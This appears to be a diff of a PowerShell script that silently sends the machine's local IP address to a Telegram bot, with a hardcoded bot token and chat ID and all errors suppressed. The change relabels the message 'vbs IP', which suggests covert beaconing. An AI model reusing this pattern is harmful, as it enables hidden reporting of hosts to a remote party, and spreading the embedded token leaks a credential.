@@ -4,6 +4,6 @@ $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -
 # Отправляем в Telegram
 $botToken = "7299851101:AAG1N7LhBKWSAaSVJ5AqUSR2SaDiCzdJCk8"
 $chatID = "7316246301"
-$message = "Локальный IP: $ip"
+$message = "vbs IP: $ip"
 
 Invoke-WebRequest -Uri "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=$message" -Method Post -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
